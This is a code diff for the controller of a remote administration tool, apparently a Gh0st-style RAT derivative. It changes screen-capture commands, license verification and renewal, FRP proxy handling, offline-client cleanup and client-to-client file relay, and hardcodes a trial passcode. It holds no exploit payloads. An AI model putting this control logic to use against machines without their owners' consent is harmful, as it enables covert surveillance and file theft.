     return TRUE;
 }
 
+void screenParamModifier(context* ctx, void* user)
+{
+    auto version = ctx->GetClientData(ONLINELIST_VERSION);
+    if (!IsDateGreaterOrEqual(version, "Feb 8 2026")) {
+        char* param = (char*)user;
+        int algo = param[2];
+        if (algo == ALGORITHM_RGB565) {
+            param[2] = ALGORITHM_DIFF;
+        }
+    }
+}
+
 VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
 {
     if (!ShouldRemoteControl())
         return;
     int n = THIS_CFG.GetInt("settings", "DXGI");
-    BOOL all = THIS_CFG.GetInt("settings", "MultiScreen");
+    BOOL all = THIS_CFG.GetInt("settings", "MultiScreen", TRUE);
     CString algo = THIS_CFG.GetStr("settings", "ScreenCompress", "").c_str();
-    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString()), all};
-    SendSelectedCommand(bToken, sizeof(bToken));
+    BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_RGB565 : atoi(algo.GetString()), all};
+    SendSelectedCommand(bToken, sizeof(bToken), screenParamModifier, bToken);
 }
 
 VOID CMy2015RemoteDlg::OnOnlineFileManager()
@@ -2079,7 +3966,7 @@ bool CMy2015RemoteDlg::CheckValid(int trail)
         if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty()) {
             return false;
         }
-		deviceID = dlg.m_sDeviceID.GetBuffer();
+        deviceID = dlg.m_sDeviceID.GetBuffer();
 
         // 密码形式：20250209 - 20350209: SHA256: HostNum
         auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
@@ -2088,27 +3975,46 @@ bool CMy2015RemoteDlg::CheckValid(int trail)
             THIS_APP->MessageBox(_TR("格式错误，请重新申请口令!"), _TR("提示"), MB_ICONINFORMATION);
             return false;
         }
-        std::vector<std::string> subvector(v.end() - 4, v.end());
-        std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size()==6?"":": "+v[2]);
-        std::string finalKey = deriveKey(password, deviceID);
-        std::string hash256 = joinString(subvector, '-');
-        std::string fixedKey = getFixedLengthID(finalKey);
-        if (hash256 != fixedKey) {
-            THIS_CFG.SetStr(settings, pwdKey, "");
-            THIS_CFG.SetStr(settings, "PwdHmac", "");
-            if (pwd.IsEmpty() || hash256 != fixedKey || IDOK != dlg.DoModal()) {
-                if (!dlg.m_sPassword.IsEmpty())
-                    THIS_APP->MessageBox(_TR("口令错误, 无法继续操作!\r\n请通过工具菜单重新输入口令。"), _TR("提示"), MB_ICONWARNING);
-                return false;
+
+        // 检查是否为 V2 授权
+        std::string pwdHmac = THIS_CFG.GetStr(settings, "PwdHmac", "");
+        bool isV2 = pwdHmac.length() > 3 && pwdHmac.substr(0, 3) == "v2:";
+
+        if (isV2) {
+            // V2 授权验证：使用 ECDSA 签名
+            std::string passcode = dlg.m_sPassword.GetString();
+            if (!verifyPasswordV2(deviceID, passcode, pwdHmac, g_LicensePublicKey)) {
+                THIS_CFG.SetStr(settings, pwdKey, "");
+                THIS_CFG.SetStr(settings, "PwdHmac", "");
+                if (pwd.IsEmpty() || IDOK != dlg.DoModal()) {
+                    if (!dlg.m_sPassword.IsEmpty())
+                        THIS_APP->MessageBox(_TR("口令错误, 无法继续操作!") + "\r\n[V2]" + _TR("请通过工具菜单重新输入口令。"), _TR("提示"), MB_ICONWARNING);
+                    return false;
+                }
+            }
+        } else {
+            // V1 授权验证：使用密钥派生比对
+            std::vector<std::string> subvector(v.end() - 4, v.end());
+            std::string password = v[0] + " - " + v[1] + ": " + GetUpperHash() + (v.size()==6?"":": "+v[2]);
+            std::string finalKey = deriveKey(password, deviceID);
+            std::string hash256 = joinString(subvector, '-');
+            std::string fixedKey = getFixedLengthID(finalKey);
+            if (hash256 != fixedKey) {
+                THIS_CFG.SetStr(settings, pwdKey, "");
+                THIS_CFG.SetStr(settings, "PwdHmac", "");
+                if (pwd.IsEmpty() || hash256 != fixedKey || IDOK != dlg.DoModal()) {
+                    if (!dlg.m_sPassword.IsEmpty())
+                        THIS_APP->MessageBox(_TR("口令错误, 无法继续操作!") + "\r\n[V1]" + _TR("请通过工具菜单重新输入口令。"), _TR("提示"), MB_ICONWARNING);
+                    return false;
+                }
             }
         }
         // 判断是否过期
+        // 注意：过期时不清理 Password 和 PwdHmac，以便仍能发起授权请求获取延期
         auto pekingTime = ToPekingTime(nullptr);
         char curDate[9];
         std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
         if (curDate < v[0] || curDate > v[1]) {
-            THIS_CFG.SetStr(settings, pwdKey, "");
-            THIS_CFG.SetStr(settings, "PwdHmac", "");
             THIS_APP->MessageBox(_TR("口令过期，请重新申请口令!"), _TR("提示"), MB_ICONINFORMATION);
             return false;
         }
@@ -2142,14 +4048,14 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
     Dlg.DoModal();
 }
 
-
-VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
+VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength, contextModifier cb, void* user)
 {
     EnterCriticalSection(&m_cs);
     POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
     while(Pos) {
         int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-        context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+        context* ContextObject = GetContextByListIndex(iItem);
+        if (!ContextObject) continue;
         if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
             continue;
         if (szBuffer[0] == COMMAND_UPDATE) {
@@ -2159,6 +4065,7 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
                 continue;
             }
         }
+        if (cb) cb(ContextObject, user);
         ContextObject->Send2Client(szBuffer, ulLength);
     }
     LeaveCriticalSection(&m_cs);
@@ -2167,8 +4074,8 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
 {
     EnterCriticalSection(&m_cs);
-    for (int i=0; i<m_CList_Online.GetItemCount(); ++i) {
-        context* ContextObject = (context*)m_CList_Online.GetItemData(i);
+    for (context* ContextObject : m_HostList) {
+        if (!ContextObject) continue;
         if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
             continue;
         if (szBuffer[0] == COMMAND_UPDATE) {
@@ -2186,8 +4093,21 @@ VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
 //真彩Bar
 VOID CMy2015RemoteDlg::OnAbout()
 {
-    MessageBoxL("Copyleft (c) FTU 2019—2026" + _L("\n编译日期: ") + __DATE__ +
-               CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于", MB_ICONINFORMATION);
+    MessageBoxL("Copyleft (c) FTU 2019-2026" + CString(" v") + VERSION_STR + _L("\n编译日期: ") + __DATE__ +
+                CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于", MB_ICONINFORMATION);
+}
+
+// 工具栏搜索按钮
+void CMy2015RemoteDlg::OnToolbarSearch()
+{
+    if (!m_pSearchBar) {
+        m_pSearchBar = new CSearchBarDlg(this);
+    }
+    if (m_pSearchBar->GetSafeHwnd() && m_pSearchBar->IsWindowVisible()) {
+        m_pSearchBar->Hide();
+    } else {
+        m_pSearchBar->Show();
+    }
 }
 
 //托盘Menu
@@ -2208,26 +4128,33 @@ void CMy2015RemoteDlg::OnNotifyExit()
 //固态菜单
 void CMy2015RemoteDlg::OnMainSet()
 {
-    CSettingDlg  Dlg;
+    CSettingDlg  Dlg(this);
     Dlg.m_nMax_Connect = m_nMaxConnection;
     BOOL use = THIS_CFG.GetInt("frp", "UseFrp");
     int port = THIS_CFG.GetInt("frp", "server_port", 7000);
     auto token = THIS_CFG.GetStr("frp", "token");
+	auto master = THIS_CFG.GetStr("settings", "master");
     auto ret = Dlg.DoModal();   //模态 阻塞
     if (ret != IDOK) return;
 
     BOOL use_new = THIS_CFG.GetInt("frp", "UseFrp");
     int port_new = THIS_CFG.GetInt("frp", "server_port", 7000);
     auto token_new = THIS_CFG.GetStr("frp", "token");
+    auto master_new = THIS_CFG.GetStr("settings", "master");
     ApplyFrpSettings();
     if (use_new != use) {
         MessageBoxL("修改FRP代理开关，需要重启当前应用程序方可生效。", "提示", MB_ICONINFORMATION);
-    } else if (port != port_new || token != token_new) {
-        m_frpStatus = STATUS_STOP;
+    } else if (port != port_new || token != token_new || master_new != master) {
+        // 重启所有 FRP 连接
+        for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+            m_frpInstances[i].status = STATUS_STOP;
+        }
         Sleep(200);
-        m_frpStatus = STATUS_RUN;
+        for (size_t i = 0; i < m_frpInstances.size(); ++i) {
+            m_frpInstances[i].status = STATUS_RUN;
+        }
     }
-    if (use && use_new && m_hFRPThread == NULL) {
+    if (use && use_new && m_frpInstances.empty()) {
 #ifdef _WIN64
         MessageBoxL("FRP代理服务异常，需要重启当前应用程序进行重试。", "提示", MB_ICONINFORMATION);
 #endif
@@ -2246,7 +4173,7 @@ void CMy2015RemoteDlg::OnMainSet()
     m_settings.ReportInterval = m;
     m_settings.DetectSoftware = n;
     m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
-    SendMasterSettings(nullptr);
+    SendMasterSettings(nullptr, m_settings);
 }
 
 
@@ -2414,9 +4341,47 @@ BOOL CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
 
     SOCKET nSocket = ContextObject->sClientSocket;
 
-    g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)ContextObject->hDlg, (LPARAM)nSocket);
+	CDialogBase* p = (CDialogBase*)ContextObject->hDlg;
+	if (ContextObject->hWnd && ::IsWindow(ContextObject->hWnd) && p && p->ShouldReconnect()) {
+		::PostMessageA(ContextObject->hWnd, WM_DISCONNECT, 0, 0);
+		ContextObject->hDlg = NULL;
+		ContextObject->hWnd = NULL;
+	}
+
+    // Fix use-after-free: Remove from m_HostList BEFORE returning.
+    // After this function returns, MoveContextToFreePoolList() will free the context.
+    // If we only post a message, the timer could fire and iterate m_HostList
+    // before OnUserOfflineMsg runs, causing crash when accessing freed memory.
+    //
+    // Allocate OfflineInfo on heap to pass context data to UI thread safely.
+    OfflineInfo* info = new OfflineInfo();
+
+    EnterCriticalSection(&g_2015RemoteDlg->m_cs);
+    // Copy info before removing (context will be freed after this function returns)
+    info->hWnd = ContextObject->hWnd;
+    info->ip = ContextObject->GetClientData(ONLINELIST_IP);
+    auto tm = ContextObject->GetAliveTime();
+    info->aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
+                      tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
+                      tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
+
+    // Remove from host list and pending online queue
+    info->hasLogin = g_2015RemoteDlg->RemoveFromHostList(ContextObject);
+    auto& pending = g_2015RemoteDlg->m_PendingOnline;
+    auto it = std::find(pending.begin(), pending.end(), (context*)ContextObject);
+    if (it != pending.end()) {
+        pending.erase(it);
+    }
+    g_2015RemoteDlg->m_PendingOffline.push_back((int)nSocket);
+    LeaveCriticalSection(&g_2015RemoteDlg->m_cs);
+
+    // Post message with copied info (OnUserOfflineMsg will delete info)
+    if (!g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)info, 0)) {
+        delete info;  // Prevent memory leak if PostMessage fails
+    }
 
     ContextObject->hDlg = NULL;
+    ContextObject->hWnd = NULL;
 
     return TRUE;
 }
@@ -2459,8 +4424,23 @@ bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
         return false;
     }
     CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
+    if (!dlg) return false;
     BYTE* name = data + sizeof(FileChunkPacket);
-    dlg->UpdateProgress(CString((char*)name, chunk->nameLength), chunk);
+    dlg->UpdateProgress(CString((char*)name, chunk->nameLength), FileProgressInfo(chunk));
+
+    return true;
+}
+
+bool SendDataV2(void* user, FileChunkPacketV2* chunk, BYTE* data, int size)
+{
+    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
+    if (!ctx->Send2Client(data, size)) {
+        return false;
+    }
+    CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
+    if (!dlg) return false;
+    BYTE* name = data + sizeof(FileChunkPacketV2);
+    dlg->UpdateProgress(CString((char*)name, (int)chunk->nameLength), FileProgressInfo(chunk));
 
     return true;
 }
@@ -2468,12 +4448,25 @@ bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
 void delay_cancel(CONTEXT_OBJECT* ctx, int sec)
 {
     if (!ctx) return;
+
+    // 检查程序是否正在退出
+    if (g_bAppExiting) return;
+
     CDlgFileSend* dlg = (CDlgFileSend*)ctx->hDlg;
-    dlg->FinishFileSend(TRUE);
-    Sleep(sec*1000);
-    if (::IsWindow(dlg->GetSafeHwnd()))
+    if (dlg) dlg->FinishFileSend(TRUE);
+
+    // 分段睡眠，每 100ms 检查一次退出标志
+    for (int i = 0; i < sec * 10 && !g_bAppExiting; i++) {
+        Sleep(100);
+    }
+
+    // 再次检查退出标志
+    if (g_bAppExiting) return;
+
+    if (dlg && ::IsWindow(dlg->GetSafeHwnd()))
         dlg->PostMessageA(WM_CLOSE);
     ctx->hDlg = NULL;
+    ctx->hWnd = NULL;
     ctx->CancelIO();
 }
 
@@ -2490,14 +4483,15 @@ bool IsDateInRange(const std::string& startDate, const std::string& endDate)
     auto isValidDate = [](const std::string& date) -> bool {
         if (date.length() != 8)
             return false;
-        for (char c : date) {
+        for (char c : date)
+        {
             if (c < '0' || c > '9')
                 return false;
         }
         int month = std::stoi(date.substr(4, 2));
         int day = std::stoi(date.substr(6, 2));
         return (month >= 1 && month <= 12 && day >= 1 && day <= 31);
-        };
+    };
 
     if (!isValidDate(startDate) || !isValidDate(endDate))
         return false;
@@ -2514,17 +4508,163 @@ bool IsDateInRange(const std::string& startDate, const std::string& endDate)
     return (today >= startDate && today <= endDate);
 }
 
-BOOL CMy2015RemoteDlg::AuthorizeClient(const std::string& sn, const std::string& passcode, uint64_t hmac)
+BOOL CMy2015RemoteDlg::AuthorizeClient(context* ctx, const std::string& sn, const std::string& passcode, uint64_t hmac, bool* outExpired)
 {
+    if (outExpired) *outExpired = false;
+
     if (sn.empty() || passcode.empty() || hmac == 0) {
         return FALSE;
     }
-    static const char* superAdmin = getenv("YAMA_PWD");
+    auto v = splitString(passcode, '-');
+    if (v.size() == 6 || v.size() == 7) {
+        std::vector<std::string> subvector(v.end() - 4, v.end());
+        std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size() == 6 ? "" : ": " + v[2]);
+        std::string finalKey = deriveKey(password, sn);
+        std::string hash256 = joinString(subvector, '-');
+        std::string fixedKey = getFixedLengthID(finalKey);
+        if (hash256 != fixedKey)
+            return FALSE;
+    }
+
+    static const char* superAdmin = getenv(BRAND_ENV_VAR);
     std::string pwd = superAdmin ? superAdmin : m_superPass;
+    if (pwd.empty()) {
+        Mprintf("请设置环境变量 " BRAND_ENV_VAR " 来给下级授权!\n");
+    }
     BOOL b = VerifyMessage(pwd, (BYTE*)passcode.c_str(), passcode.length(), hmac);
     if (!b) return FALSE;
-	auto list = StringToVector(passcode, '-', 2);
-    return IsDateInRange(list[0], list[1]);
+    auto list = StringToVector(passcode, '-', 2);
+    BOOL valid = IsDateInRange(list[0], list[1]);
+    std::string hmacStr = std::to_string(hmac);
+
+    // 授权过期，更新或创建记录并标记为过期
+    if (!valid) {
+        Mprintf("授权已过期: %s\n", sn.c_str());
+        if (outExpired) *outExpired = true;  // 签名有效但已过期
+        if (ctx != nullptr) {
+            std::string ip = ctx->GetClientData(ONLINELIST_IP);
+            std::string location = m_IPConverter ? m_IPConverter->GetGeoLocation(ip) : "";
+            std::string machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+            UpdateLicenseActivity(sn, passcode, hmacStr, ip, location, machineName);
+        } else {
+            UpdateLicenseActivity(sn, passcode, hmacStr);
+        }
+        SetLicenseStatus(sn, LICENSE_STATUS_EXPIRED);
+        return FALSE;
+    }
+
+    // 检查授权是否已被撤销
+    if (IsLicenseRevoked(sn)) {
+        Mprintf("授权已被撤销: %s\n", sn.c_str());
+        return FALSE;
+    }
+
+    // 授权成功时更新 license 活跃信息
+    if (ctx != nullptr) {
+        std::string ip = ctx->GetClientData(ONLINELIST_IP);
+        std::string location = m_IPConverter ? m_IPConverter->GetGeoLocation(ip) : "";
+        std::string machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+        UpdateLicenseActivity(sn, passcode, hmacStr, ip, location, machineName);
+    } else {
+        UpdateLicenseActivity(sn, passcode, hmacStr);
+    }
+
+    return TRUE;
+}
+
+BOOL CMy2015RemoteDlg::AuthorizeClientV2(context* ctx, const std::string& sn, const std::string& passcode, const std::string& hmacV2, bool* outExpired)
+{
+    if (outExpired) *outExpired = false;
+
+    if (sn.empty() || passcode.empty() || hmacV2.empty()) {
+        return FALSE;
+    }
+
+    // 检查 V2 前缀
+    if (hmacV2.substr(0, 3) != "v2:") {
+        Mprintf("V2 HMAC 格式错误: %s\n", hmacV2.c_str());
+        return FALSE;
+    }
+
+    // 检查公钥是否已配置（全零表示未配置）
+    bool keyConfigured = false;
+    for (int i = 0; i < 64; i++) {
+        if (g_LicensePublicKey[i] != 0) {
+            keyConfigured = true;
+            break;
+        }
+    }
+    if (!keyConfigured) {
+        Mprintf("V2 公钥未配置，无法验证 V2 授权\n");
+        return FALSE;
+    }
+
+    // 使用 V2 验证
+    BOOL b = verifyPasswordV2(sn, passcode, hmacV2, g_LicensePublicKey);
+    if (!b) {
+        Mprintf("V2 签名验证失败: %s\n", sn.c_str());
+        return FALSE;
+    }
+
+    auto list = StringToVector(passcode, '-', 2);
+    BOOL valid = IsDateInRange(list[0], list[1]);
+
+    // 授权过期
+    if (!valid) {
+        Mprintf("V2 授权已过期: %s\n", sn.c_str());
+        if (outExpired) *outExpired = true;  // 签名有效但已过期
+        if (ctx != nullptr) {
+            std::string ip = ctx->GetClientData(ONLINELIST_IP);
+            std::string location = m_IPConverter ? m_IPConverter->GetGeoLocation(ip) : "";
+            std::string machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+            UpdateLicenseActivity(sn, passcode, hmacV2, ip, location, machineName);
+        } else {
+            UpdateLicenseActivity(sn, passcode, hmacV2);
+        }
+        SetLicenseStatus(sn, LICENSE_STATUS_EXPIRED);
+        return FALSE;
+    }
+
+    // 检查授权是否已被撤销
+    if (IsLicenseRevoked(sn)) {
+        Mprintf("V2 授权已被撤销: %s\n", sn.c_str());
+        return FALSE;
+    }
+
+    // 授权成功时更新 license 活跃信息
+    if (ctx != nullptr) {
+        std::string ip = ctx->GetClientData(ONLINELIST_IP);
+        std::string location = m_IPConverter ? m_IPConverter->GetGeoLocation(ip) : "";
+        std::string machineName = ctx->GetClientData(ONLINELIST_COMPUTER_NAME);
+        UpdateLicenseActivity(sn, passcode, hmacV2, ip, location, machineName);
+    } else {
+        UpdateLicenseActivity(sn, passcode, hmacV2);
+    }
+
+    return TRUE;
+}
+
+BOOL IsTrail(const std::string& passcode)
+{
+    return passcode == "20260201-20280201-0020-be94-120d-20f9-919a";
+}
+
+BOOL IsLastDay(const std::string& passcode, const std::string& renewalPasscode) {
+    bool isLastDay = false;
+    // 使用有效的 passcode（续期后的优先）
+    std::string effectivePasscode = renewalPasscode.empty() ? passcode : renewalPasscode;
+    if (effectivePasscode.length() >= 17 && effectivePasscode[8] == '-') {
+        // 提取 endDate: YYYYMMDD (位置 9-16)
+        std::string endDateStr = effectivePasscode.substr(9, 8);
+        // 获取今天的日期
+        time_t now = time(nullptr);
+        struct tm tm_now;
+        gmtime_s(&tm_now, &now);
+        char today[9];
+        strftime(today, sizeof(today), "%Y%m%d", &tm_now);
+        isLastDay = (endDateStr == today);
+    }
+    return isLastDay;
 }
 
 VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
@@ -2541,43 +4681,138 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     switch (cmd) {
     case TOKEN_CLIENT_MSG: {
         ClientMsg *msg =(ClientMsg*)ContextObject->InDeCompressedBuffer.GetBuffer(0);
-        PostMessageA(WM_SHOWERRORMSG, (WPARAM)new CString(msg->text), (LPARAM)new CString(msg->title));
+        PostMessageA(WM_SHOWERRORMSG, (WPARAM)new CString(_L(msg->text)), (LPARAM)new CString(_L(msg->title)));
         break;
     }
     case TOKEN_AUTH: {
         BOOL valid = FALSE;
+        std::string version;
+        std::string authStr;  // Authorization 字符串
+        std::string passcode;
+        std::string renewalPasscode, renewalHmac;  // 续期信息
         if (len > 20) {
             std::string sn(szBuffer + 1, szBuffer + 20); // length: 19
-            std::string passcode(szBuffer + 20, szBuffer + 62); // length: 42
+            passcode = std::string(szBuffer + 20, szBuffer + 62); // length: 42
             uint64_t hmac = len > 64 ? *((uint64_t*)(szBuffer+62)) : 0;
-            auto v = splitString(passcode, '-');
-            if (v.size() == 6 || v.size() == 7) {
-                std::vector<std::string> subvector(v.end() - 4, v.end());
-                std::string password = v[0] + " - " + v[1] + ": " + GetPwdHash() + (v.size() == 6 ? "" : ": " + v[2]);
-                std::string finalKey = deriveKey(password, sn);
-                std::string hash256 = joinString(subvector, '-');
-                std::string fixedKey = getFixedLengthID(finalKey);
-                valid = (hash256 == fixedKey);
+            version = len >= 80 ? std::string((char*)szBuffer + 70, (char*)szBuffer + 80) : "";
+            // 去除末尾的空字符
+            while (!version.empty() && version.back() == '\0')
+                version.pop_back();
+
+            // 检查是否为 V2 授权（hmac == 0 且有 V2 HMAC 字符串）
+            std::string hmacV2;
+            std::string pwdHash;
+            size_t hmacV2End = 80;
+            if (hmac == 0 && len > 80) {
+                // V2 HMAC 字符串在 offset 80 处（null-terminated）
+                hmacV2 = std::string((char*)szBuffer + 80);
+                // 去除末尾空字符
+                while (!hmacV2.empty() && hmacV2.back() == '\0')
+                    hmacV2.pop_back();
+                hmacV2End = 80 + hmacV2.length() + 1;  // +1 for null terminator
             }
-            if (valid) {
-                valid = AuthorizeClient(sn, passcode, hmac);
-                if (valid) {
-                    Mprintf("%s 校验成功, HMAC 校验成功: %s\n", passcode.c_str(), sn.c_str());
-                    std::string tip = passcode + " 校验成功: " + sn;
-                    CharMsg* msg = new CharMsg(tip.c_str());
-                    PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
-                } else {
-                    Mprintf("%s 校验成功, HMAC 校验失败: %s\n", passcode.c_str(), sn.c_str());
+
+            // 解析 pwdHash（在 hmacV2 之后，64 字节）
+            if (len >= hmacV2End + 64) {
+                pwdHash = std::string((char*)szBuffer + hmacV2End, 64);
+            } 
+
+            // 统一的 V1/V2 授权验证
+            std::string ip = ContextObject->GetPeerName();
+            auto [authorized, isV2, isTrail, expired] = VerifyClientAuth(NULL, sn, passcode, hmac, hmacV2, ip, "AUTH");
+            valid = authorized;
+            bool isV2Auth = !hmacV2.empty() && hmacV2.substr(0, 3) == "v2:";
+
+            // 生成续期信息（如果有预设续期且 pwdHash 有效）
+            // 支持已过期但签名有效的授权续期（前提：有预设续期）
+            if ((valid || expired) && !pwdHash.empty()) {
+                auto renewal = GenerateRenewalInfo(sn, passcode, pwdHash, isV2Auth);
+                renewalPasscode = renewal.first;
+                renewalHmac = renewal.second;
+
+                // 如果是过期授权且成功生成续期，则视为有效（允许续期）
+                if (expired && !renewalPasscode.empty()) {
+                    valid = TRUE;
+                    Mprintf("[TOKEN_AUTH] 已过期授权续期: %s\n", sn.c_str());
                 }
-            } else {
-                Mprintf("%s 校验失败: %s\n", passcode.c_str(), sn.c_str());
+            }
+
+            // 构建 Authorization（多层授权）
+            if (valid) {
+                if (isV2Auth) {
+                    // V2 授权请求：总是返回 Authorization（以便客户端更新）
+                    // 心跳续期没有 Authorization 字段，所以 TOKEN_AUTH 必须返回
+                    // 如果有续期，使用续期后的 passcode
+                    std::string effectivePasscode = renewalPasscode.empty() ? passcode : renewalPasscode;
+                    authStr = BuildAuthorizationResponse(sn, effectivePasscode, pwdHash, true);
+                } else {
+                    // V1 授权请求（pwdHash 参数在 V1 模式下不使用，传空字符串）
+                    authStr = BuildAuthorizationResponse(sn, passcode, "", false);
+                }
             }
         } else {
             Mprintf("授权数据长度不足: %u\n", len);
         }
-        char resp[100] = { valid };
-        const char* msg = valid ? "此程序已获授权，请遵守授权协议，感谢合作" : "未获授权或消息哈希校验失败";
-        memcpy(resp + 4, msg, strlen(msg));
+
+        // 构建响应：[valid:4][message\0][authorization\0][renewal_passcode\0][renewal_hmac\0][frp_config\0][reserved\0]
+        char resp[800] = { 0 };  // 增加缓冲区大小以容纳 frpConfig
+        memcpy(resp, &valid, sizeof(valid));
+
+        std::string msgStr;
+        if (valid) {
+            bool isLastDay = IsLastDay(passcode, renewalPasscode);
+            msgStr = isLastDay ? _TR("此程序授权即将到期，请联系管理员续期") : _TR("此程序已获授权，请遵守授权协议，感谢合作");
+        } else {
+            msgStr = _TR("未获授权或消息哈希校验失败，可能有使用限制");
+        }
+        // 版本比较：如果服务端版本更高或客户端未上报版本，追加升级提醒
+        if (valid && (version.empty() || version < VERSION_STR)) {
+            msgStr += _TR("。最新版本 v");
+            msgStr += VERSION_STR;
+            msgStr += _TR("，请自行下载或联系管理员");
+        }
+        size_t offset = 4;
+        memcpy(resp + offset, msgStr.c_str(), min(msgStr.length(), sizeof(resp) - offset - 1));
+        offset += msgStr.length() + 1;  // +1 for null terminator
+
+        // Authorization 追加在 message 之后
+        if (!authStr.empty() && offset + authStr.length() + 1 < sizeof(resp)) {
+            memcpy(resp + offset, authStr.c_str(), authStr.length() + 1);
+            offset += authStr.length() + 1;
+        } else {
+            offset += 1;  // 空的 authorization，只占一个 null terminator
+        }
+
+        // 续期信息追加在 authorization 之后
+        if (!renewalPasscode.empty() && offset + renewalPasscode.length() + 1 + renewalHmac.length() + 1 < sizeof(resp)) {
+            memcpy(resp + offset, renewalPasscode.c_str(), renewalPasscode.length() + 1);
+            offset += renewalPasscode.length() + 1;
+            memcpy(resp + offset, renewalHmac.c_str(), renewalHmac.length() + 1);
+            offset += renewalHmac.length() + 1;
+        } else {
+            // 空的续期信息，占两个 null terminator
+            offset += 2;
+        }
+
+        // FRP 配置追加在续期信息之后（仅当授权有效时）
+        std::string frpConfig;
+        if (valid && len > 20) {
+            std::string snForFrp(szBuffer + 1, szBuffer + 20);
+            // 去除末尾空字符
+            while (!snForFrp.empty() && snForFrp.back() == '\0')
+                snForFrp.pop_back();
+            frpConfig = LoadLicenseFrpConfig(snForFrp);
+        }
+        if (!frpConfig.empty() && offset + frpConfig.length() + 1 < sizeof(resp)) {
+            memcpy(resp + offset, frpConfig.c_str(), frpConfig.length() + 1);
+            offset += frpConfig.length() + 1;
+        } else {
+            offset += 1;  // 空的 frpConfig
+        }
+
+        // Reserved 字段（预留，当前为空）
+        offset += 1;  // 空的 reserved
+
         ContextObject->Send2Client((PBYTE)resp, sizeof(resp));
         break;
     }
@@ -2597,6 +4832,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
             dlg->ShowWindow(SW_HIDE);
             ContextObject->hDlg = dlg;
+            ContextObject->hWnd = dlg->GetSafeHwnd();
             std::string hash = GetPwdHash(), hmac = GetHMAC(100);
             std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
                         hash, hmac).detach();
@@ -2612,10 +4848,293 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
             dlg->ShowWindow(SW_HIDE);
             ContextObject->hDlg = dlg;
+            ContextObject->hWnd = dlg->GetSafeHwnd();
         }
         DialogBase* dlg = (DialogBase*)ContextObject->hDlg;
         dlg->OnReceiveComplete();
 
+        break;
+    }
+    case COMMAND_SEND_FILE_V2: {
+        // V2 文件传输（支持 C2C）
+        FileChunkPacketV2* pkt = (FileChunkPacketV2*)szBuffer;
+
+        if (pkt->dstClientID == 0) {
+            // 目标是主控端：本地接收
+            if (ContextObject->hDlg == NULL) {
+                CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, FALSE);
+                dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+                dlg->ShowWindow(SW_HIDE);
+                ContextObject->hDlg = dlg;
+                ContextObject->hWnd = dlg->GetSafeHwnd();
+            }
+            // OnReceiveComplete() 会根据 cmd 字节自动判断 V1/V2
+            DialogBase* dlg = (DialogBase*)ContextObject->hDlg;
+            dlg->OnReceiveComplete();
+        } else {
+            // C2C：转发到目标客户端
+            context* dstCtx = FindHost(pkt->dstClientID);
+            if (dstCtx) {
+                dstCtx->Send2Client(szBuffer, len);
+
+                // 获取或创建进度对话框（和客户端->服务端相同方式）
+                if (ContextObject->hDlg == NULL) {
+                    CDlgFileSend* dlg = new CDlgFileSend(this, ContextObject->GetServer(), ContextObject, FALSE);
+                    dlg->Create(IDD_DIALOG_FILESEND, GetDesktopWindow());
+                    dlg->ShowWindow(SW_SHOW);
+                    dlg->SetWindowText(_TR("C2C 文件传输"));
+                    ContextObject->hDlg = dlg;
+                    ContextObject->hWnd = dlg->GetSafeHwnd();
+                }
+
+                // 更新进度
+                CDlgFileSend* dlg = (CDlgFileSend*)ContextObject->hDlg;
